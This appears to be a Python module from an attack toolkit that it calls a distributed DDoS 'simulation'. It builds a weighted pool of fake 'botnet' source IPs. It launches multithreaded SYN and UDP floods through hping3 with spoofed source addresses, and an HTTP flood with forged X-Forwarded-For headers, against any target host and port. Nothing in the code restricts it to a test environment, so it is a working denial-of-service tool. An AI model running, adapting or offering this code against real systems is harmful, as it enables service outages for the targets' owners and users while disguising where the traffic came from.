"""
Distributed DDoS Attacks
Multi-source attack simulation with realistic IP distribution
"""

import subprocess
import time
import threading
import random
from typing import List, Dict
from .base import AttackBase
from .utils import check_tool_installed


class BotnetIPPool:
    """
    Realistic botnet IP pool with weighted distribution
    
    Simulates real botnet behavior:
    - Some IPs are more active (zombie hosts)
    - Geographic distribution
    - Different ISPs
    - Persistent IPs (not random each time)
    """
    
    def __init__(self, pool_size: int = 100):
        """
        Initialize IP pool
        
        Args:
            pool_size: Number of IPs in the pool
        """
        self.pool_size = pool_size
        self.ip_pool = self._generate_realistic_ips()
        self.ip_weights = self._generate_weights()
    
    def _generate_realistic_ips(self) -> List[str]:
        """Generate realistic IP addresses from various regions"""
        ips = []
        
        # Geographic distribution (realistic botnet composition)
        regions = {
            # Asia-Pacific (40%)
            'apac': {
                'prefixes': ['103', '110', '111', '112', '113', '114', '115', '116', '117', '118'],
                'count': int(self.pool_size * 0.4)
            },
            # Europe (25%)
            'eu': {
                'prefixes': ['80', '81', '82', '83', '84', '85', '86', '87', '88', '89'],
                'count': int(self.pool_size * 0.25)
            },
            # North America (20%)
            'na': {
                'prefixes': ['23', '24', '50', '63', '64', '65', '66', '67', '68', '69'],
                'count': int(self.pool_size * 0.20)
            },
            # South America (10%)
            'sa': {
                'prefixes': ['177', '179', '181', '186', '187', '189', '190', '191'],
                'count': int(self.pool_size * 0.10)
            },
            # Others (5%)
            'other': {
                'prefixes': ['41', '102', '105', '154', '196', '197'],
                'count': int(self.pool_size * 0.05)
            }
        }
        
        for region, config in regions.items():
            for _ in range(config['count']):
                prefix = random.choice(config['prefixes'])
                ip = f"{prefix}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                ips.append(ip)
        
        return ips
    
    def _generate_weights(self) -> Dict[str, float]:
        """
        Generate weights for IPs (some are more active)
        
        Follows power law distribution:
        - 20% of IPs generate 80% of traffic (Pareto principle)
        - Simulates zombie hosts with varying activity levels
        """
        weights = {}
        
        # Sort IPs for consistent weighting
        sorted_ips = sorted(self.ip_pool)
        
        # Top 20% are "super zombies" (high activity)
        top_20_count = int(len(sorted_ips) * 0.2)
        for ip in sorted_ips[:top_20_count]:
            weights[ip] = random.uniform(5.0, 10.0)  # 5-10x more active
        
        # Next 30% are "active zombies"
        next_30_count = int(len(sorted_ips) * 0.3)
        for ip in sorted_ips[top_20_count:top_20_count + next_30_count]:
            weights[ip] = random.uniform(2.0, 5.0)  # 2-5x more active
        
        # Remaining 50% are "normal zombies"
        for ip in sorted_ips[top_20_count + next_30_count:]:
            weights[ip] = random.uniform(0.5, 2.0)  # Normal activity
        
        return weights
    
    def get_random_ip(self) -> str:
        """Get random IP with weighted distribution"""
        # Weighted random selection
        total_weight = sum(self.ip_weights.values())
        rand_val = random.uniform(0, total_weight)
        
        cumulative = 0
        for ip, weight in self.ip_weights.items():
            cumulative += weight
            if rand_val <= cumulative:
                return ip
        
        return random.choice(self.ip_pool)
    
    def get_top_ips(self, n: int = 10) -> List[str]:
        """Get top N most active IPs"""
        sorted_ips = sorted(self.ip_weights.items(), key=lambda x: x[1], reverse=True)
        return [ip for ip, _ in sorted_ips[:n]]


class DistributedAttack(AttackBase):
    """
    Distributed Attack Simulation
    
    Simulates botnet attack with:
    - Realistic IP pool (persistent IPs)
    - Weighted distribution (some IPs more active)
    - Multiple attack types
    - Coordinated timing
    """
    
    def __init__(self, target: str, port: int = 80, verbose: bool = True, pool_size: int = 100):
        """
        Initialize distributed attack
        
        Args:
            target: Target IP/hostname
            port: Target port
            verbose: Verbose logging
            pool_size: Size of botnet IP pool
        """
        super().__init__(target, port, verbose)
        self.ip_pool = BotnetIPPool(pool_size)
        self.log('INFO', f'Initialized botnet with {pool_size} IPs')
        self.log('INFO', f'Top 5 most active IPs: {", ".join(self.ip_pool.get_top_ips(5))}')
    
    def execute(self, duration: int, attack_type: str = 'syn', threads: int = 10, **kwargs) -> bool:
        """
        Execute distributed attack
        
        Args:
            duration: Attack duration in seconds
            attack_type: Type of attack ('syn', 'udp', 'http')
            threads: Number of concurrent attack threads
            
        Returns:
            True if successful
        """
        self.log('ATTACK', f'🔴 Starting DISTRIBUTED {attack_type.upper()} attack')
        self.log('INFO', f'Duration: {duration}s | Botnet size: {self.ip_pool.pool_size} | Threads: {threads}')
        
        if attack_type in ['syn', 'udp']:
            return self._execute_layer3_distributed(duration, attack_type, threads)
        elif attack_type == 'http':
            return self._execute_http_distributed(duration, threads)
        else:
            self.log('ERROR', f'Unknown attack type: {attack_type}')
            return False
    
    def _execute_layer3_distributed(self, duration: int, attack_type: str, threads: int) -> bool:
        """Execute distributed Layer 3/4 attack"""
        
        if not check_tool_installed('hping3'):
            self.log('ERROR', 'hping3 not installed')
            return False
        
        def worker():
            """Worker thread - uses different source IPs"""
            end_time = time.time() + duration
            local_count = 0
            
            while time.time() < end_time and not self.stop_flag:
                # Get weighted random IP
                source_ip = self.ip_pool.get_random_ip()
                
                # Build command with specific source IP
                if attack_type == 'syn':
                    cmd = [
                        'hping3', '-S', '-p', str(self.port),
                        '-a', source_ip,  # Spoof source IP
                        '-c', '100',  # Send 100 packets
                        self.target
                    ]
                else:  # udp
                    cmd = [
                        'hping3', '--udp', '-p', str(self.port),
                        '-a', source_ip,
                        '-c', '100',
                        self.target
                    ]
                
                try:
                    # Run attack burst
                    proc = subprocess.Popen(
                        cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE
                    )
                    proc.wait(timeout=2)
                    local_count += 100
                    
                except:
                    pass
            
            self.stats['packets_sent'] += local_count
        
        try:
            self.start()
            
            # Launch attack threads
            attack_threads = []
            for _ in range(threads):
                t = threading.Thread(target=worker, daemon=True)
                t.start()
                attack_threads.append(t)
            
            # Monitor progress
            while time.time() < self.stats['start_time'] + duration and not self.stop_flag:
                time.sleep(5)
                self.log('INFO', f'Packets sent: {self.stats["packets_sent"]:,}')
            
            self.stop_flag = True
            
            for t in attack_threads:
                t.join(timeout=2)
            
            self.stop()
            self.log('SUCCESS', f'✓ Distributed {attack_type} completed: {self.stats["packets_sent"]:,} packets')
            return True
            
        except Exception as e:
            self.log('ERROR', f'Distributed attack failed: {str(e)}')
            self.stop()
            return False
    
    def _execute_http_distributed(self, duration: int, threads: int) -> bool:
        """Execute distributed HTTP flood"""
        import socket
        
        def worker():
            """Worker thread - uses different source IPs in User-Agent"""
            end_time = time.time() + duration
            local_count = 0
            
            while time.time() < end_time and not self.stop_flag:
                try:
                    # Get weighted random IP for User-Agent
                    source_ip = self.ip_pool.get_random_ip()
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.target, self.port))
                    
                    # Include source IP in User-Agent (simulates X-Forwarded-For)
                    request = f"GET / HTTP/1.1\r\n"
                    request += f"Host: {self.target}\r\n"
                    request += f"User-Agent: Mozilla/5.0 (Botnet-{source_ip})\r\n"
                    request += f"X-Forwarded-For: {source_ip}\r\n"
                    request += "Connection: close\r\n\r\n"
                    
                    sock.sendall(request.encode())
                    sock.recv(1024)
                    sock.close()
                    
                    local_count += 1
                    
                except:
                    pass
            
            self.stats['requests_sent'] += local_count
        
        try:
            self.start()
            
            attack_threads = []
            for _ in range(threads):
                t = threading.Thread(target=worker, daemon=True)
                t.start()
                attack_threads.append(t)
            
            time.sleep(duration)
            self.stop_flag = True
            
            for t in attack_threads:
                t.join(timeout=2)
            
            self.stop()
            
            total = self.stats['requests_sent']
            rate = total / self.get_duration() if self.get_duration() > 0 else 0
            
            self.log('SUCCESS', f'✓ Distributed HTTP completed: {total:,} requests ({rate:.2f} req/s)')
            self.log('INFO', f'Unique IPs used: {self.ip_pool.pool_size}')
            return True
            
        except Exception as e:
            self.log('ERROR', f'Distributed HTTP failed: {str(e)}')
            self.stop()
            return False
